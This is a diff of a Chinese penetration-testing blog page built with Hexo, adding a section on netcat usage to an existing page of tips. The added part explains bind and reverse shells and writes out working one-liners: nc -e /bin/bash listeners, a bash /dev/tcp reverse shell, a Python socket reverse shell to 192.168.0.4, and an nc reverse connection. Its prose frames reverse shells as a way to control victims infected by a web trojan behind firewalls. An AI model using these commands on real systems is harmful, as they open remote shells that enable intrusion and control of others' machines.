@@ -5,7 +5,7 @@
 <head>
     <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
     <meta name="keywords" content="渗透小tips（一）, HTML,CSS,JavaScript,JQuery,java,linux等">
-    <meta name="description" content="sqlmap，burp+xray的工具使用">
+    <meta name="description" content="sqlmap，burp+xray,nc工具使用">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -458,21 +458,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-04-10
+                    2022-04-27
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    777
+                    1.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    5 分
                 </div>
                 
 
@@ -591,7 +591,38 @@
 <blockquote>
 <p>E = error      B = bilnd     T = time     S = standard</p>
 </blockquote>
+<h2 id="nc使用"><a href="#nc使用" class="headerlink" title="nc使用"></a>nc使用</h2><h3 id="正向反弹"><a href="#正向反弹" class="headerlink" title="正向反弹"></a>正向反弹</h3><p>ubuntu或者CentOS上面输入</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> -lvp <span class="token number">7777</span> -e /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
+<p>kali上输入</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token function">ip</span> <span class="token number">7777</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>正向反弹是目标机先执行nc命令，然后kali上再进行nc监听，即可反弹shell。</p>
+<p>需要目标机安装nc。</p>
+<h3 id="反向反弹shell"><a href="#反向反弹shell" class="headerlink" title="反向反弹shell"></a>反向反弹shell</h3><p>反弹shell（reverse shell），就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。</p>
+<h4 id="为什么要反弹shell？"><a href="#为什么要反弹shell？" class="headerlink" title="为什么要反弹shell？"></a><strong>为什么要反弹shell？</strong></h4><p>1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p>
+<p>2.目标机器的ip动态改变，你不能持续控制。</p>
+<p>3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p>
+<p>4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。</p>
+<p>那么反弹就很好理解了，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p>
+<h4 id="方法1：bash反弹"><a href="#方法1：bash反弹" class="headerlink" title="方法1：bash反弹"></a>方法1：bash反弹</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">&gt;&amp;</span> /dev/tcp/ip/port <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>但首先需要在kali上使用nc监听端口：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> -lvp <span class="token number">7777</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>此方法在ubuntu下不会反弹成功，CentOS可以反弹成功。</p>
+<p>如果我们处于内网，我们可以借助frp进行端口代理，但是目标主机处于内网你就没法正向代理了。</p>
+<h4 id="方法2：python反弹"><a href="#方法2：python反弹" class="headerlink" title="方法2：python反弹"></a>方法2：python反弹</h4><p>首先，使用nc在kali上监听端口：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> -lvp <span class="token number">7777</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>在CentOS或者ubuntu下使用python去反向连接，输入：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python -c "import os,socket,subprocess<span class="token punctuation">;</span><span class="token assign-left variable">s</span><span class="token operator">=</span>socket.socket<span class="token punctuation">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="token punctuation">)</span><span class="token punctuation">;</span>s.connect<span class="token variable"><span class="token punctuation">((</span>'<span class="token number">192.168</span><span class="token number">.0</span><span class="token number">.4</span>'<span class="token punctuation">,</span><span class="token number">7777</span><span class="token punctuation">))</span></span><span class="token punctuation">;</span>os.dup2<span class="token punctuation">(</span>s.fileno<span class="token punctuation">(</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span><span class="token punctuation">;</span>os.dup2<span class="token punctuation">(</span>s.fileno<span class="token punctuation">(</span><span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span class="token punctuation">;</span>os.dup2<span class="token punctuation">(</span>s.fileno<span class="token punctuation">(</span><span class="token punctuation">)</span>,2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token assign-left variable">p</span><span class="token operator">=</span>subprocess.call<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'/bin/bash'</span>,<span class="token string">'-i'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="方法3"><a href="#方法3" class="headerlink" title="方法3"></a>方法3</h4><p>首先在kali上输入nc监听：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> -lvp <span class="token number">7777</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>在CentOS或者ubuntu 上使用nc去反向连接，命令如下：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> -e /bin/bash <span class="token number">192.168</span>.0.4 <span class="token number">7777</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
                 
             </div>
             <hr/>
